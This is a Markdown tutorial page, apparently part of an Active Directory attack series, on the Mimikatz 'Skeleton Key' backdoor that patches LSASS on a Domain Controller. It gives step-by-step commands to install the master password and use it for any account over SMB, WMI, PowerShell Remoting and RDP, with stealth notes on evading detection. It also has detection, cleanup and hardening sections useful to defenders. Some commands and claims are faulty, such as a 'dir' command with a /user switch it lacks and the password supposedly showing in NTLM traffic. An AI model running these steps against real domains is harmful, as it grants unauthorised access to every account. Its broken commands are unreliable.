# Skeleton Key Backdoor

## Overview

The **Skeleton Key** is an in-memory persistence technique using Mimikatz. It patches the `msv1_0.dll` authentication module in LSASS on a Domain Controller, injecting a **master password** that works for **any account** in the domain.

When the skeleton key is active, any user can authenticate with their normal password — or with the skeleton key password. This means even `Administrator:any_password` will work if you use the skeleton key password instead.

**Key Advantage:** All domain accounts remain functional. There are no new accounts or modified passwords. The skeleton key password works as a **backdoor master key** for every single domain user.

**Key Limitation:** The patch is **in-memory only**. A DC reboot removes it. It must be re-applied after each reboot.

---

## Prerequisites

- **Domain Admin** or **SYSTEM** access on a Domain Controller (must run Mimikatz in the context of LSASS)
- Ability to write Mimikatz to disk (or use reflective DLL injection)
- Tools: Mimikatz

---

## Step 1: Deploy and Execute Skeleton Key

### Standard Skeleton Key Attack

```cmd
mimikatz.exe privilege::debug
misc::skeleton
```

Default skeleton key password: **`mimikatz`**

### With Custom Password

The default password is hardcoded to `mimikatz`. To use a custom password, you must modify the Mimikatz source code or use an alternative tool.

### One-Liner (Full Chain)

```cmd
mimikatz.exe "privilege::debug" "misc::skeleton" "exit"
```

---

## Step 2: Verify the Skeleton Key is Active

From any domain-joined machine (even non-admin), attempt to authenticate using the skeleton key password:

```cmd
net use \\DC01\C$ /user:DOMAIN\Administrator mimikatz
```

Or:

```cmd
net use \\DC01\C$ /user:DOMAIN\SomeUser mimikatz
```

If successful, the skeleton key is active.

**Testing with RunAs:**

```cmd
runas /user:DOMAIN\AnyUser mimikatz
```

---

## Step 3: Using the Skeleton Key

### Access Any Domain Resource

The skeleton key works for **all users** and **all authentication protocols** that rely on the NTLM hash:

```cmd
# File share access
dir \\DC01\SYSVOL\ /user:DOMAIN\jdoe mimikatz

# WMI
wmic /node:DC01 /user:DOMAIN\jdoe /password:mimikatz process list

# PowerShell Remoting
$password = ConvertTo-SecureString "mimikatz" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("DOMAIN\jdoe", $password)
Enter-PSSession -ComputerName DC01 -Credential $cred

# Remote Desktop (if allowed)
mstsc /v:DC01 /prompt
```

### Logging In as Any User

You can authenticate as **any domain user** using the skeleton key password. The user's original password also continues to work.

---

## OPSEC / Stealth Considerations

| Factor | Consideration |
|--------|---------------|
| **In-Memory Only** | No files written to disk (default Mimikatz runs from memory). However, LSASS patching is detectable. |
| **Reboot Vulnerability** | The skeleton key is **lost on reboot**. Must be re-applied. |
| **Default Password** | The default password is `mimikatz` (well-known). Any defender seeing NTLM auth with this string will immediately identify the backdoor. |
| **AV/EDR Detection** | `misc::skeleton` patches `mimikatz` string into `msv1_0.dll` in memory. Modern EDR (CrowdStrike, Defender for Endpoint) detects LSASS API hooking and suspicious DLL patches. |
| **LSASS Crash Risk** | Patching LSASS can cause instability. In some cases, the DC may crash. |
| **Skeleton Key String** | The string `mimikatz` is present in LSASS memory after patching — forensic memory analysis will reveal it. |
| **Event Logging** | The skeleton key itself generates no specific event, but failed logon attempts (event 4625) may appear if the user tries the skeleton key and the user's normal password simultaneously. |

---

## Detection

### Event Logs to Monitor

| Event ID | Description | Where |
|----------|-------------|-------|
| **4625** | Failed logon (if user types wrong password instead of skeleton key) | DC Security Log |
| **4624** | Successful logon — look for anomalies in authentication patterns | DC Security Log |
| **4672** | Special privileges assigned (if skeleton key used with privileged account) | DC Security Log |
| **4688** | Process creation — look for Mimikatz execution | DC Security Log |
| **7045** | Service installation (if Mimikatz was installed as a service) | System Log |

### Detection Indicators

1. **LSASS API Hooking Detection** — EDR alerts on `NtCreateThreadEx` or `OpenProcess` targeting LSASS
2. **`mimikatz` string in NTLM authentication** — Monitor for the string `mimikatz` in NTLM authentication payloads (network monitoring / Zeek / Suricata)
3. **Memory Analysis** — LSASS memory contains the string `mimikatz` within the `msv1_0.dll` module
4. **Skeleton Key Behavior** — Logons from multiple different user accounts originating from the same source IP with the same unusual password hash pattern
5. **Unusual LSASS Memory** — Mimikatz opens LSASS with `PROCESS_ALL_ACCESS` which EDR tools can detect

### Detection Commands (on DC)

**Check if LSASS is patched (memory forensic):**

```powershell
# Look for "mimikatz" in LSASS memory (requires Task Manager or Process Explorer)
# Use Process Explorer: View DLLs for LSASS, check msv1_0.dll for modifications
```

**Look for the skeleton key string in NTLM traffic:**

Network monitors can inspect NTLM authentication and alert on known skeleton key password hashes.

**PowerShell Detection Script:**

```powershell
# Check if LSASS contains patched code (conceptual — requires Minidump access)
# Look for modifications to msv1_0.dll in LSASS memory
```

### EDR Telemetry

- **Sysmon Event 10** (Process access) — LSASS accessed by a non-LSASS process with `PROCESS_ALL_ACCESS`
- **Sysmon Event 8** (CreateRemoteThread) — Remote thread creation in LSASS
- **Sysmon Event 7** (Image loaded) — Unusual DLL loaded into LSASS

---

## Cleanup / Reversal

### Reboot the Domain Controller

The skeleton key is in-memory only. **Rebooting the DC removes it completely.**

```cmd
shutdown /r /t 0 /m \\DC01
```

### Remove Skeleton Key Without Reboot (If Possible)

There is no Mimikatz command to "unpatch" the skeleton key. The only options are:

1. **Reboot the Domain Controller** (preferred)
2. **Kill and restart LSASS** (not possible — Windows will bugcheck)
3. **Restore original `msv1_0.dll` from disk** (requires replacing DLL in memory — extremely complex and risky)

### Verify Removal

After reboot, verify the skeleton key no longer works:

```cmd
net use \\DC01\C$ /user:DOMAIN\Administrator mimikatz
```

This should fail with "Access denied" or "Logon failure."

### Post-Cleanup

- **Reset KRBTGT** twice if there's any evidence the hash was also extracted
- **Rotate all privileged account passwords** (user passwords are not directly compromised, but the authentication bypass was in effect)
- **Enable LSASS protection** (Credential Guard) to prevent future LSASS attacks:

```powershell
# Enable LSASS protection (requires reboot)
New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name RunAsPPL -Value 1 -PropertyType DWORD -Force
```

- **Enable Windows Defender Credential Guard** via Group Policy
- **Audit Domain Controllers** for other backdoors (SSP, scheduled tasks, services)

---

## References

- [Benjamin Delpy — Mimikatz Skeleton Key](https://twitter.com/gentilkiwi/status/640620127939538944)
- [Mimikatz Wiki — misc::skeleton](https://github.com/gentilkiwi/mimikatz/wiki/module-~-misc)
- [ADSecurity.org — Skeleton Key](https://adsecurity.org/?p=1275)
- MITRE ATT&CK: T1556.006 (Modify Authentication Process: Skeleton Key)

---

**Next:** [05 - DCShadow](05_DCShadow.md)
